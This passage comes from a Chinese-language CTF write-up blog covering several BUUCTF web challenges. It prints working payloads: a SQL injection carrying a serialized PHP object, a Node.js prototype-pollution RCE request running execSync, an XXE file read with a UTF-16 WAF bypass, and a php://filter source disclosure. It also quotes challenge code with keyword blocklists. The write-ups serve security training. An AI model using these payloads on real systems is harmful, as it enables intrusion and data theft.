class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;title&#x27;</span>=&gt;<span class="hljs-variable">$title</span>,<span class="hljs-string">&#x27;filename&#x27;</span>=&gt;<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;ext&#x27;</span>=&gt;<span class="hljs-variable">$ext</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-keyword">$this</span>-&gt;folder.<span class="hljs-variable">$basename</span>.<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$ext</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这里文件名可控也就是,$File[“name”]&#x3D;&gt;filename 而$title的值由于它有关</p><p>那么这里补位，然后再闭合</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,&#x27;<span class="hljs-number">1</span>&#x27;,<span class="hljs-number">0</span>x<span class="hljs-number">4</span>f<span class="hljs-number">3</span>a<span class="hljs-number">363</span>a<span class="hljs-number">2268656</span>c<span class="hljs-number">706572223</span>a<span class="hljs-number">323</span>a<span class="hljs-number">7</span>b<span class="hljs-number">733</span>a<span class="hljs-number">393</span>a<span class="hljs-number">225</span>c<span class="hljs-number">305</span>c<span class="hljs-number">305</span>c<span class="hljs-number">30696676696577223</span>b<span class="hljs-number">623</span>a<span class="hljs-number">313</span>b<span class="hljs-number">733</span>a<span class="hljs-number">393</span>a<span class="hljs-number">225</span>c<span class="hljs-number">305</span>c<span class="hljs-number">305</span>c<span class="hljs-number">30636</span>f<span class="hljs-number">6</span>e<span class="hljs-number">666967223</span>b<span class="hljs-number">733</span>a<span class="hljs-number">353</span>a<span class="hljs-number">222</span>f<span class="hljs-number">666</span>c<span class="hljs-number">6167223</span>b<span class="hljs-number">7</span>d),(&#x27;<span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>对应</p><p><code>&#39;title&#39;=&gt;$title,&#39;filename&#39;=&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;=&gt;$ext,&#39;path&#39;=&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext</code></p><p>然后去show.php就可以看到flag了</p><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061213039.png" alt="image-20220206121326956"></p><p>整体功能由js实现，访问<a href="http://www.zip下载源码/">www.zip下载源码</a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">safeKeyword</span>(<span class="hljs-params">keyword</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(keyword.match(<span class="hljs-regexp">/(admin)/i</span>s)) &#123;<br>      <span class="hljs-keyword">return</span> keyword<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">undefined</span><br>&#125;<br></code></pre></td></tr></table></figure><p>注册用户时不能有admin，然后我们又在注册用户的代码中发现下面这部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">req.session.user=&#123;<br>     <span class="hljs-string">&#x27;user&#x27;</span>:req.body.userid.toUpperCase(),<br>     <span class="hljs-string">&#x27;passwd&#x27;</span>: req.body.pwd,<br>     <span class="hljs-string">&#x27;isLogin&#x27;</span>:<span class="hljs-literal">false</span><br>   &#125;<br></code></pre></td></tr></table></figure><p>这里对user的值取大写，大小写变换的字符都可能引发安全问题，存在于个js大小写字符转化的特例</p><p>P神的文章有讲解：<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>“K”.toLowerCase() &#x3D;&#x3D; ‘k’</p><p>“ı”.toUpperCase() &#x3D;&#x3D; ‘I’，”ſ”.toUpperCase() &#x3D;&#x3D; ‘S’</p><p>admin &#x3D;&gt;admın。这个登录注册居然在一起放着 好吧 ，得到flag位置</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202061511274.png" alt="image-20220206151105183"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript">router.post(<span class="hljs-string">&#x27;/action&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  <span class="hljs-keyword">if</span>(req.session.user.user!=<span class="hljs-string">&quot;ADMIN&quot;</span>)&#123;res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>)&#125; <br>  req.session.user.data = clone(req.body);<br>  res.end(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;</span>);  <br>&#125;);<br></code></pre></td></tr></table></figure><p>这个地方会构成原型链污染攻击</p><p>然后发现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">router.get(<span class="hljs-string">&#x27;/info&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>,data=&#123;<span class="hljs-string">&#x27;user&#x27;</span>:res.outputFunctionName&#125;);<br>&#125;)<br></code></pre></td></tr></table></figure><p>这个 OutputFuctioname可控还可以用来rce，直接打了</p><p>数据包如下 主要是贴上json的恶意字符串，然后修改 Content-Type:application&#x2F;json</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/action</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>156<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://152220b9-6852-4b0e-be21-fa3659aa3124.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; session=s%3AiHKzS2MMwFKjL4YzWFrTZ5d5NUdnGs76.qIS0v1KDbJW%2B5pandbezjfmES5lkFmRuTy9svZ1JW1o<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="json">&#123;<span class="hljs-attr">&quot;lua&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;outputFunctionName&quot;</span>:<span class="hljs-string">&quot;a=1;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;)//&quot;</span>&#125;,<span class="hljs-attr">&quot;Submit&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</span><br></code></pre></td></tr></table></figure><p>然后刷新页面即可，这个也可以连接到你的服务器上面</p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>我自己试了试文件上传的姿势都不行,结合题目给的xml源码应该是考察的xxe相关考点</p><p>&#x2F;about 提示flag在 &#x2F;flag</p><p> 构造</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">users</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">xxe</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///flag&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">users</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>bob<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>passwd2<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span> Bob<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>bob@fakesite.com<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span>  <br>        <span class="hljs-tag">&lt;<span class="hljs-name">group</span>&gt;</span>CSAW2019<span class="hljs-tag">&lt;/<span class="hljs-name">group</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">intro</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">intro</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">users</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是被waf拦住了</p><p>通过转换编码来绕过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><br>iconv -f utf8 -t utf-16 1.xml &gt; 2.xml<br></code></pre></td></tr></table></figure><p>然后直接上传即可getflag</p><h2 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h2><p>Please upload a PNG image less than 256kB and smaller than 256px*256px.</p><p>这是题目的要求</p><p>这里可以直接去除图片的数据块，只留头部和IHDR标志位</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062033871.png" alt="image-20220206203354766"></p><h2 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h2><p>啊这，访问 register.php注册一个账号</p><p>使用伪协议读取源码 user.php</p><p>​    <code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81/user.php?page=php://filter/convert.base64-encode/resource=user</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;function.php&quot;</span>);<br><span class="hljs-keyword">if</span>( !<span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ))&#123;<br>    Header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br><br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE_admin</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$oper_you_can_do</span> = <span class="hljs-variable">$OPERATE</span>;<br>&#125;<br><span class="hljs-comment">//die($_SESSION[&#x27;isadmin&#x27;]);</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] === <span class="hljs-string">&#x27;1&#x27;</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>]) || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;info&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>])|| <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>] === <span class="hljs-string">&#x27;&#x27;</span>)&#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$page</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;page&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$page</span> === <span class="hljs-string">&#x27;info&#x27;</span>)<br>        &#123;<br><span class="hljs-comment">//            echo(&quot;&lt;script&gt;alert(&#x27;no premission to visit info, only admin can, you are guest&#x27;)&lt;/script&gt;&quot;);</span><br>            Header(<span class="hljs-string">&quot;Location: user.php?page=guest&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br>filter_directory();<br><span class="hljs-comment">//if(!in_array($page,$oper_you_can_do))&#123;</span><br><span class="hljs-comment">//    $page = &#x27;info&#x27;;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;<span class="hljs-subst">$page</span>.php&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>session_start();<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Hacker</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    Header(<span class="hljs-string">&quot;Location: hacker.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_directory_guest</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$keywords</span> = [<span class="hljs-string">&quot;flag&quot;</span>,<span class="hljs-string">&quot;manage&quot;</span>,<span class="hljs-string">&quot;ffffllllaaaaggg&quot;</span>,<span class="hljs-string">&quot;info&quot;</span>];<br>    <span class="hljs-variable">$uri</span> = parse_url(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_URI&quot;</span>]);<br>    parse_str(<span class="hljs-variable">$uri</span>[<span class="hljs-string">&#x27;query&#x27;</span>], <span class="hljs-variable">$query</span>);<br><span class="hljs-comment">//    var_dump($query);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$keywords</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$token</span>)<br>    &#123;<br>        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$query</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span> =&gt; <span class="hljs-variable">$v</span>)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$k</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>            <span class="hljs-keyword">if</span> (stristr(<span class="hljs-variable">$v</span>, <span class="hljs-variable">$token</span>))<br>                hacker();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$blacklist</span> = <span class="hljs-string">&quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;</span>;<br>    <span class="hljs-variable">$whitelist</span> = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;(),_*`-@=+&gt;&lt;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; strlen(<span class="hljs-variable">$string</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">if</span> (strpos(<span class="hljs-string">&quot;<span class="hljs-subst">$whitelist</span>&quot;</span>, <span class="hljs-variable">$string</span>[<span class="hljs-variable">$i</span>]) === <span class="hljs-literal">false</span>) &#123;<br>            Hacker();<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/<span class="hljs-subst">$blacklist</span>/is&quot;</span>, <span class="hljs-variable">$string</span>)) &#123;<br>        Hacker();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (is_string(<span class="hljs-variable">$string</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;real_escape_string(<span class="hljs-variable">$string</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_query</span>(<span class="hljs-params"><span class="hljs-variable">$sql_query</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$mysqli</span>-&gt;query(<span class="hljs-variable">$sql_query</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$user</span> = Filter(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = md5(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `albert_users` where `username_which_you_do_not_know`= &#x27;<span class="hljs-subst">$user</span>&#x27; and `password_which_you_do_not_know_too` = &#x27;<span class="hljs-subst">$pass</span>&#x27;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span>-&gt;num_rows) &#123;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$res</span>-&gt;fetch_array();<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-variable">$data</span>[username_which_you_do_not_know];<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] = <span class="hljs-number">1</span>;<br>        <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;isadmin&#x27;</span>] = <span class="hljs-variable">$data</span>[isadmin_which_you_do_not_know_too_too];<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">updateadmin</span>(<span class="hljs-params"><span class="hljs-variable">$level</span>,<span class="hljs-variable">$user</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#x27;<span class="hljs-subst">$level</span>&#x27; where `username_which_you_do_not_know`=&#x27;<span class="hljs-subst">$user</span>&#x27; &quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$sql</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br><span class="hljs-comment">//    var_dump($res);</span><br><span class="hljs-comment">//    die();</span><br><span class="hljs-comment">//    die($res);</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$res</span> == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$mysqli</span>;<br>    <span class="hljs-variable">$user</span> = Filter(<span class="hljs-variable">$user</span>);<br>    <span class="hljs-variable">$pass</span> = md5(<span class="hljs-variable">$pass</span>);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#x27;<span class="hljs-subst">$user</span>&#x27;,&#x27;<span 